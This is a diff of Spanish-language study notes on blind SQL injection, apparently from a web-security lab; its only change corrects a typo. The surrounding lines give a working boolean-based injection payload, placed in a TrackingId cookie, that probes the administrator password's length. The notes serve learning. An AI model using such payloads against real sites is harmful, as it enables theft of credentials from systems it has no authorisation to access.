@@ -77,7 +77,7 @@ La tabla DUAL es una tabla especial de una sola columna presente de manera prede
 - En este caso el vulnerable es el TrackID, por lo que cuando algo es correcto nos sale en la web 'Welcome Back!'
 Ademas de esto debemos de saber el nombre correcto de la DB, username, y asi nosotros por medio de un script de python3 podriamos adivinar la password.
 	**Cookie: TrackingId=v54JPAcaS7lKSevV; session=O3YFg0GqU8Wjyv9qBo6F4JDUQGxuTdfg** Es la original
-- Para que el script fucnione debemos de saber la longitud de la password y eso se hace de esta manera:
+- Para que el script funcione debemos de saber la longitud de la password y eso se hace de esta manera:
 	**Cookie: TrackingId=v54JPAcaS7lKSevV' and (select 'a' from *users* where *username*='administrator' and length(*password*)>=20)='a'-- -; session=O3YFg0GqU8Wjyv9qBo6F4JDUQGxuTdfg**
 	* users -> DBs
 	* username -> nombre de usuario valido 
